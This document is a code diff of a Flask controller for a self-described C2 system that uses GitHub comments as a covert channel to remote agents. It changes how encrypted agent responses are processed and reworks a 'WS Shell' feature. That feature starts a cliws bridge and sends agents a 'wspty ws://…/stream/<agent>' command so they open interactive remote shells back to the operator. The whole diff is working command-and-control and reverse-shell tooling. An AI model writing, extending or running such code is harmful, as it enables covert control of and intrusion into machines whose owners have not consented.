@@ -1306,6 +1306,7 @@ def _process_comments(agent: dict, comments: list, password: str):
     conn    = _conn()
     last_ts = None
     saw_new_response = False   # P0-2: only actual new <!-- r --> responses count as agent activity
+    watermark_hold = False     # 解密/落库失败挡住水位，避免后一条成功把前一条跳过
 
     for c in comments:
         cid  = c["id"]
@@ -1316,7 +1317,8 @@ def _process_comments(agent: dict, comments: list, password: str):
             # they do NOT refresh last_reply. Otherwise the GitHub `since=`
             # semantics (which includes the boundary comment) would keep the
             # agent permanently "online".
-            last_ts = c.get("updated_at") or c.get("created_at") or last_ts
+            if not watermark_hold:
+                last_ts = c.get("updated_at") or c.get("created_at") or last_ts
             continue
 
         # last_seen 只跟 Agent 回显走。控制器自己贴的 <!-- c --> 不刷，
@@ -1340,6 +1342,7 @@ def _process_comments(agent: dict, comments: list, password: str):
             if dec is None:
                 # 与 <!-- r --> 一致：密码错时不 mark，修好 Secret 后还能重试。
                 debug_log(f"_process_comments: command-echo decrypt failed aid={aid} cid={cid}")
+                watermark_hold = True
                 continue
             try:
                 env      = json.loads(dec)
@@ -1371,7 +1374,8 @@ def _process_comments(agent: dict, comments: list, password: str):
                         db.msg_save(conn, aid, cmd_text, True, cmd_id, None, "command")
 
             db.comment_mark(conn, aid, cid)
-            last_ts = c.get("updated_at") or c.get("created_at") or last_ts
+            if not watermark_hold:
+                last_ts = c.get("updated_at") or c.get("created_at") or last_ts
             continue
 
         # ── Response (<!-- r -->) ─────────────────────────────────────────────
@@ -1380,7 +1384,8 @@ def _process_comments(agent: dict, comments: list, password: str):
         elif not body.startswith("<!--"):
             # Not a recognized C2-prefixed comment (e.g. GitHub web UI comment) — skip decrypt
             db.comment_mark(conn, aid, cid)
-            last_ts = c.get("updated_at") or c.get("created_at") or last_ts
+            if not watermark_hold:
+                last_ts = c.get("updated_at") or c.get("created_at") or last_ts
             continue
         else:
             raw = body
@@ -1403,6 +1408,7 @@ def _process_comments(agent: dict, comments: list, password: str):
                 })
             # 永不 mark、不推进水位：改对密码后这些回包还能捞回来。
             # 只告警，避免第 5 次把评论从信道里「处理掉」。
+            watermark_hold = True
             continue
 
         with _lock:
@@ -1419,20 +1425,23 @@ def _process_comments(agent: dict, comments: list, password: str):
         if content.startswith("[Part "):
             chunk_st = _handle_chunk(aid, content, resp_to, msg_type)
             if not chunk_st:
+                watermark_hold = True
                 continue          # persist 失败：不 mark，下一轮重试
             db.comment_mark(conn, aid, cid)
-            last_ts = c.get("updated_at") or c.get("created_at") or last_ts
+            if not watermark_hold:
+                last_ts = c.get("updated_at") or c.get("created_at") or last_ts
             if chunk_st == "done":
                 saw_new_response = True
             continue
 
         _dispatch_response(aid, content, resp_to, msg_type, agent)
         db.comment_mark(conn, aid, cid)
-        last_ts = c.get("updated_at") or c.get("created_at") or last_ts
+        if not watermark_hold:
+            last_ts = c.get("updated_at") or c.get("created_at") or last_ts
         saw_new_response = True
 
     if last_ts:
-        if agent.get("channel") == "worker":
+        if agent.get("channel") == "worker" and not watermark_hold:
             ids = [c.get("id") for c in comments if str(c.get("id", "")).isdigit()]
             last_ts = str(max(int(i) for i in ids)) if ids else last_ts
         with _lock:
@@ -5174,28 +5183,14 @@ def _save_wsshell_session(agent_id: str, session_id: str,
 
 # ── REST: start / connect / stop / status ────────────────────────────────────
 
-@app.route("/api/wsshell/start", methods=["POST"])
-@login_required
-def api_wsshell_start():
-    """Start cliws backend (no agent needed). Mirrors shellStart()."""
-    data = request.json or {}
-
-    with _lock:
-        ctrl_ip   = (data.get("controller_ip")   or "").strip() or _state.get("wspty_host", "")
-        ctrl_port = (data.get("controller_port") or "").strip() or _state.get("wspty_port", "7337")
-
+def _cliws_start(ctrl_ip: str, port: int) -> tuple[bool, dict]:
+    """Kill any leftover one-shot bridge and start a fresh cliws `-b` pair."""
     if not ctrl_ip:
-        return jsonify({"error": "controller_ip required（配置控制端 IP）"}), 400
-
-    try:
-        port = int(ctrl_port)
-        if not (1 <= port <= 65534):
-            raise ValueError
-    except ValueError:
-        return jsonify({"error": f"无效端口: {ctrl_port}（需 1-65534）"}), 400
-
+        return False, {"error": "controller_ip required（配置控制端 IP）"}
+    if not (1 <= int(port) <= 65534):
+        return False, {"error": f"无效端口: {port}（需 1-65534）"}
     if not os.path.isfile(CLIWS_BIN):
-        return jsonify({"error": f"cliws binary not found at {CLIWS_BIN}"}), 500
+        return False, {"error": f"cliws binary not found at {CLIWS_BIN}"}
 
     _cliws_stop()
 
@@ -5211,9 +5206,9 @@ def api_wsshell_start():
             capture_output=True, timeout=5,
         )
         if r.returncode != 0:
-            return jsonify({
+            return False, {
                 "error": f"tmux start failed: {r.stderr.decode(errors='replace').strip()}"
-            }), 500
+            }
         used_tmux = True
     else:
         kwargs: dict = dict(
@@ -5239,54 +5234,96 @@ def api_wsshell_start():
     time.sleep(1.0)
     if not _cliws_running():
         _cliws_stop()
-        return jsonify({
-            "error": f"cliws 启动失败（端口 {port} 可能已被占用，或权限不足）"
-        }), 500
+        return False, {"error": f"cliws 启动失败（端口 {port} 可能已被占用，或权限不足）"}
 
     debug_log(f"WS Shell: cliws started port={port} tmux={tmux_name if used_tmux else 'no'}")
-    _audit("wsshell_start", detail=f"port={port} tmux={used_tmux}")
-    return jsonify({
+    return True, {
         "ok":           True,
         "port":         port,
         "tmux":         used_tmux,
         "tmux_session": tmux_name if used_tmux else None,
         "attach_cmd":   f"tmux attach -t {tmux_name}" if used_tmux else None,
-    })
+    }
+
+
+@app.route("/api/wsshell/start", methods=["POST"])
+@login_required
+def api_wsshell_start():
+    """Start cliws backend (no agent needed). Mirrors shellStart()."""
+    data = request.json or {}
+
+    with _lock:
+        ctrl_ip   = (data.get("controller_ip")   or "").strip() or _state.get("wspty_host", "")
+        ctrl_port = (data.get("controller_port") or "").strip() or _state.get("wspty_port", "7337")
+
+    try:
+        port = int(ctrl_port)
+    except (TypeError, ValueError):
+        return jsonify({"error": f"无效端口: {ctrl_port}（需 1-65534）"}), 400
+
+    ok, payload = _cliws_start(ctrl_ip, port)
+    if not ok:
+        return jsonify(payload), 400 if "controller_ip" in payload.get("error", "") else 500
+    _audit("wsshell_start", detail=f"port={port} tmux={payload.get('tmux')}")
+    return jsonify(payload)
 
 
 @app.route("/api/wsshell/connect", methods=["POST"])
 @login_required
 def api_wsshell_connect():
-    """Send wspty command to the selected agent. Requires cliws already running."""
+    """Recycle the one-shot cliws pair, then send a fresh wspty command."""
     data     = request.json or {}
     agent_id = data.get("agent_id", "")
     if not agent_id:
         return jsonify({"error": "agent_id required"}), 400
 
-    if not _cliws_running():
-        return jsonify({"error": "cliws 未运行，请先点击「▶ 启动 cliws」"}), 400
-
     with _cliws_lock:
-        port    = _cliws_session.get("port")
-        ctrl_ip = _cliws_session.get("ctrl_ip", "")
         prev    = _cliws_session.get("bound_agent_id")
-        prev_sibs = list(_cliws_session.get("bound_sibling_ids") or [])
+        sess_ip = _cliws_session.get("ctrl_ip", "")
+        sess_pt = _cliws_session.get("port")
+    with _lock:
+        ctrl_ip   = (data.get("controller_ip") or "").strip() or sess_ip or _state.get("wspty_host", "")
+        ctrl_port = (data.get("controller_port") or "").strip() or (
+            str(sess_pt) if sess_pt else _state.get("wspty_port", "7337")
+        )
 
-    if prev and str(prev) != str(agent_id) and str(agent_id) not in prev_sibs \
-            and str(prev) not in _sibling_ids_for(agent_id):
+    try:
+        port = int(ctrl_port)
+    except (TypeError, ValueError):
+        return jsonify({"error": f"无效端口: {ctrl_port}（需 1-65534）"}), 400
+
+    # Stop leftover agent wspty first. A reconnecting agent will occupy the
+    # next one-shot slot and the browser gets "connected, 0 bytes".
+    _internal_send(agent_id, "wspty:close")
+    if prev and str(prev) != str(agent_id):
         _internal_send(prev, "wspty:close")
+        debug_log(f"WS Shell: wspty:close before reconnect (was {prev})")
+
+    ok_start, start_info = _cliws_start(ctrl_ip, port)
+    if not ok_start:
+        return jsonify(start_info), 500
 
     ws_url = f"ws://{ctrl_ip}:{port}/stream/{agent_id}"
     ok, result = _internal_send(agent_id, f"wspty {ws_url}")
     if not ok:
+        _cliws_stop()
+        debug_log(f"WS Shell: wspty send failed, cliws rolled back: {result}")
         return jsonify({"error": result}), 500
 
     with _cliws_lock:
         _cliws_session["bound_agent_id"] = agent_id
         _cliws_session["bound_sibling_ids"] = _sibling_ids_for(agent_id)
-    debug_log(f"WS Shell: wspty sent {ws_url} → agent {agent_id}")
+    debug_log(f"WS Shell: recycled cliws + wspty {ws_url} → agent {agent_id}")
     _audit("wsshell_connect", agent_id, ws_url)
-    return jsonify({"ok": True, "ws_url": ws_url, "command_id": result})
+    return jsonify({
+        "ok": True,
+        "ws_url": ws_url,
+        "command_id": result,
+        "recycled": True,
+        "tmux_session": start_info.get("tmux_session"),
+        "attach_cmd": start_info.get("attach_cmd"),
+        "port": port,
+    })
 
 
 @app.route("/api/wsshell/disconnect", methods=["POST"])
@@ -5439,17 +5476,11 @@ def wsshell_ws_proxy(ws, agent_id: str):
 
     _save_wsshell_session(agent_id, session_id, started_at, bytes(recording))
 
-    # Notify agent to stop retrying.
-    # Case A: cliws is NO LONGER running (it exited on its own — bash exited or crashed).
-    #   → Agent has lost its WS and is retrying; send wspty:close so it stops immediately.
-    # Case B: cliws IS still running (browser navigated away / refreshed).
-    #   → Agent is still connected to cliws; do NOT send wspty:close so the operator
-    #     can reopen the browser and resume the session.
-    if not _cliws_running():
-        _internal_send(agent_id, "wspty:close")
-        debug_log(f"WS Shell: cliws stopped, wspty:close sent to agent={agent_id}")
-    else:
-        debug_log(f"WS Shell: browser closed but cliws still running, agent stays connected")
+    # Always stop the agent side. cliws `-b` cannot resume a pair after the
+    # proxy hangs up; leaving wspty running just auto-reconnects and poisons
+    # the next browser session (connect, 1ms close, no data).
+    _internal_send(agent_id, "wspty:close")
+    debug_log(f"WS Shell: browser proxy closed, wspty:close sent to agent={agent_id}")
 
     debug_log(f"WS Shell: browser proxy closed for agent={agent_id}")
 
